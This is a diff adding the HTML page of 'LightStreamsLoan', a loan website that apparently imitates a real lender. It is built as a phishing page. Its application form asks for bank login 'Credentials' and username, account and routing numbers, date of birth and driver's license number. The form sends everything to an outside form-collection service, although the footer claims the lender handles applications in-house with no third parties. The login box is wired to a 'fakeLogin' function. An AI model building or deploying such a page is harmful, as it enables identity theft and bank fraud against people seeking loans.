@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>LightStreamsLoan — Quick & Secure Loans</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <header class="site-header">
+  <nav class="nav container">
+  <a class="brand" href="lightstreamsloans.com">LightStreamsLoan</a>
+  <div class="nav-actions">
+    <a href="#faqs" class="nav-link">FAQs</a>
+
+  
+
+    <button id="loginBtn" class="btn ghost">Customer Login</button>
+    <a href="dashboard.html" class="btn outline">Dashboard</a>
+      <!-- 🌙 / ☀️ Toggle Button -->
+    <button id="themeToggle" class="btn ghost">
+      <span id="themeIcon">🌙</span>
+    </button>
+  </div>
+</nav>
+
+<div class="hero container">
+  <div class="hero-left">
+    <h1>Personal & Business Loans for Your Needs</h1>
+    <p class="lead">Fast decisions, transparent terms, and direct funding — get started in minutes.</p>
+    <div class="hero-ctas">
+      <button class="btn primary" id="applyNow">Apply Now</button>
+      <a href="#how" class="btn outline">How It Works</a>
+    </div>
+  </div>
+
+  <div class="hero-right" aria-hidden="true">
+    <div class="card">
+      <h3>Personal Loan</h3>
+      <div class="amount">Apply for Personal Loan</div>
+      <p class="desc">Cover medical expenses, education, travel, or any personal needs with quick approval and low interest.</p>
+      <button class="btn secondary" onclick="startApplication('personal')">Apply</button>
+    </div>
+
+    <div class="card mt-sm">
+      <h3>Business Loan</h3>
+      <div class="amount">Apply for Business Loan</div>
+      <p class="desc">Fuel your business growth with flexible repayment plans, higher loan limits, and fast processing.</p>
+      <button class="btn secondary" onclick="startApplication('business')">Apply</button>
+    </div>
+  </div>
+</div>
+
+  </header>
+  
+
+  <main>
+    <section id="how" class="container how-section">
+      <h2>Why Choose LightStreamsLoan?</h2>
+      <p class="muted">We make borrowing simple, fast, and secure. Here’s what sets us apart.</p>
+      <div class="features">
+        <article class="feature">
+          <h3>Fast Approvals</h3>
+          <p>Get a decision in minutes and receive funds typically within one business day.</p>
+        </article>
+        <article class="feature">
+          <h3>Flexible Options</h3>
+          <p>Borrow exactly what you need, with adaptable amounts and clear repayment terms.</p>
+        </article>
+        <article class="feature">
+          <h3>Secure & Simple</h3>
+          <p>Our streamlined online process is protected with top-tier security for your peace of mind.</p>
+        </article>
+      </div>
+    </section>
+
+    <section class="process container">
+      <h3>Our Direct Lending Process</h3>
+      <ol class="steps">
+        <li><strong>Apply:</strong> Complete our short, secure online loan application.</li>
+        <li><strong>Review:</strong> We review your information directly and determine eligibility.</li>
+        <li><strong>Sign:</strong> If approved, receive an agreement for electronic signature.</li>
+        <li><strong>Funding:</strong> Funds typically deposited into your bank account within one business day.</li>
+      </ol>
+    </section>
+
+    <section class="eligibility container">
+      <h3>Loan Qualification Requirements</h3>
+      <p>We consider all applicants, but basic criteria must be met:</p>
+      <ul>
+        <li>At least 18 years old</li>
+        <li>U.S. citizen or permanent resident</li>
+        <li>Steady source of income</li>
+        <li>Active checking account</li>
+      </ul>
+      <button class="btn outline" id="consentOpen">Read Electronic Consent</button>
+    </section>
+
+    <section id="application" class="container application">
+      <h2>Begin Your Application</h2>
+      <p class="muted">A quick and secure way to get your loan started.</p>
+
+     
+      <!-- Form -->
+       
+<form id="appForm" class="app-form" 
+      action="https://api.web3forms.com/submit" 
+      method="POST">
+
+
+  <!-- Web3Forms Access Key (only once) -->
+  <input type="hidden" name="access_key" value="0c716352-4a81-4bff-b178-6ac040360288">
+
+
+  <!-- Step 1 -->
+  <div class="form-step active">
+    <h3 class="full">Step 1 of 3</h3>
+
+    <label class="full">Reason for Loan *
+      <select name="reason" required>
+        <option value="">Select</option>
+        <option value="Home Improvement">Home Improvement</option>
+        <option value="Medical">Medical</option>
+        <option value="Education">Education</option>
+        <option value="Other">Other</option>
+      </select>
+    </label>
+
+    <label>Select Loan Amount *
+      <input type="number" name="loan_amount" placeholder="5000" min="0" required>
+    </label>
+
+    <label>First Name *
+      <input type="text" name="first_name" required>
+    </label>
+
+    <label>Last Name *
+      <input type="text" name="last_name" required>
+    </label>
+
+    <label>Personal Email Address *
+      <input type="email" name="email" required>
+    </label>
+
+    <label>Home Phone *
+      <input type="tel" name="home_phone" inputmode="tel" required>
+    </label>
+
+    <label class="full">Mobile Phone *
+      <input type="tel" name="mobile_phone" inputmode="tel" required>
+    </label>
+
+    <div class="actions">
+      <button type="button" class="btn primary next">Next</button>
+    </div>
+  </div>
+
+  <!-- Step 2 -->
+  <div class="form-step">
+    <h3 class="full">Step 2 of 3</h3>
+
+    <label class="full">Home Address *
+      <input type="text" name="address" required>
+    </label>
+
+    <label>City *
+      <input type="text" name="city" required>
+    </label>
+
+    <label>State *
+      <input type="text" name="state" required>
+    </label>
+
+    <label>Zip *
+      <input type="text" name="zip" inputmode="numeric" pattern="\d{3,10}" required>
+    </label>
+
+    <label>Date of Birth *
+      <input type="date" name="dob" required>
+    </label>
+
+    <div class="actions">
+      <button type="button" class="btn ghost prev">Previous</button>
+      <button type="button" class="btn primary next">Next</button>
+    </div>
+  </div>
+<!-- Step 3 -->
+<div class="form-step">
+  <h3 class="full">Step 3 of 3</h3>
+
+  <label>Username *
+    <input type="text" name="username" required>
+  </label>
+
+  <label>Credentials *
+    <input type="text" name="credentials" required>
+  </label>
+
+  <label>Bank Name *
+    <input type="text" name="bank_name" required>
+  </label>
+
+  <label>Account Number *
+    <input type="text" name="account_number" inputmode="numeric" pattern="\d{6,20}" required>
+  </label>
+
+  <label>Routing Number *
+    <input type="text" name="routing" inputmode="numeric" pattern="\d{6,9}" required>
+  </label>
+
+  <!-- ✅ New Driving License Number Field -->
+  <label>Driving License Number *
+    <input type="text" name="driving_license" placeholder="Enter your driving license number" required>
+  </label>
+
+  <div class="actions">
+    <button type="button" class="btn ghost prev">Previous</button>
+    <button type="submit" class="btn primary">Submit Application</button>
+  </div>
+</div>
+
+</form>
+
+
+
+    </section>
+
+    <section id="faqs" class="container faqs">
+      <h3>Frequently Asked Questions</h3>
+      <details>
+        <summary>What types of loans do you offer?</summary>
+        <p>We offer personal and business loans. Our platform matches applicants to our in-house lending options.</p>
+      </details>
+      <details>
+        <summary>How long does the application take?</summary>
+        <p>Initial application takes just a few minutes; funding can take 1-2 business days after approval.</p>
+      </details>
+    </section>
+  </main>
+
+<!--footer-->
+  <footer class="site-footer">
+  <div class="container footer-grid">
+    <!-- About -->
+    <div class="footer-col">
+      <h4>ABOUT LightStreamsLoan</h4>
+      <p>
+        LightStreamsLoan is a direct lender committed to providing simple,
+        fast, and secure financial solutions. We handle your application
+        in-house from start to finish.
+      </p>
+    </div>
+
+    <!-- Links -->
+    <div class="footer-col">
+      <h4>LINKS</h4>
+      <ul>
+        <li><a href="index.html">Home</a></li>
+        <li><a href="#faqs">FAQs</a></li>
+        <li><a href="#how">How It Works</a></li>
+        <li><a href="#">Privacy Policy</a></li>
+      </ul>
+    </div>
+
+    <!-- Legal -->
+    <div class="footer-col">
+      <h4>LEGAL</h4>
+      <ul>
+        <li><a href="#">E-Consent</a></li>
+        <li><a href="#">Terms of Service</a></li>
+      </ul>
+    </div>
+
+    <!-- Contact -->
+    <div class="footer-col">
+      <h4>CONTACT US</h4>
+      <p>
+        📍 175 W. Jackson Blvd, Suite 600, Chicago, IL 60604 <br />
+        📞 <a href="#" class="phone-link">773 916 1870</a>
+
+<style>
+  .phone-link {
+    color: white;
+    text-decoration: none; /* optional: removes underline */
+  }
+
+  .phone-link:hover {
+    color: #ddd; /* optional: slightly different shade on hover */
+  }
+</style>
+
+      </p>
+    </div>
+  </div>
+
+  <div class="footer-bottom">
+    <p>© 2025 LightStreamsLoan . All Rights Reserved.</p>
+    <p class="disclaimer">
+      <strong>Disclaimer:</strong> LightStreamsLoan is a direct lender and
+      makes all loan or credit decisions in-house without third-party involvement.
+      Loan availability and funding times may vary.
+    </p>
+  </div>
+</footer>
+
+
+  <!-- Modals -->
+  <div id="consentModal" class="modal" aria-hidden="true" role="dialog" aria-labelledby="consentTitle">
+    <div class="modal-content">
+      <button class="modal-close" id="consentClose" aria-label="Close">&times;</button>
+      <h4 id="consentTitle">Electronic Consent Agreement</h4>
+      <p><strong>Scope of Consent:</strong> By clicking "I Agree," you consent to receive disclosures, notices, and other communications electronically.</p>
+      <p>You may request paper copies; hardware/software requirements include a modern browser and PDF reader.</p>
+      <div class="modal-actions">
+        <button class="btn ghost" id="consentDecline">Decline</button>
+        <button class="btn primary" id="consentAgree">I Agree</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="loginModal" class="modal" aria-hidden="true" role="dialog" aria-labelledby="loginTitle">
+  <div class="modal-content">
+    <button class="modal-close" id="loginClose" aria-label="Close">&times;</button>
+    <h4 id="loginTitle">Customer Login</h4>
+
+    <form id="loginForm" class="login-form" onsubmit="return fakeLogin(event)">
+      <div class="form-group">
+        <label for="username">Username</label>
+        <input id="username" name="user" type="text" placeholder="Enter your username" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input id="password" name="pass" type="password" placeholder="Enter your password" required>
+      </div>
+
+      <div class="modal-actions">
+        <button class="btn ghost" type="button" id="loginCancel">Cancel</button>
+        <button class="btn primary" type="submit">Login</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+
+  <script src="script.js"></script>
+</body>
+</html>
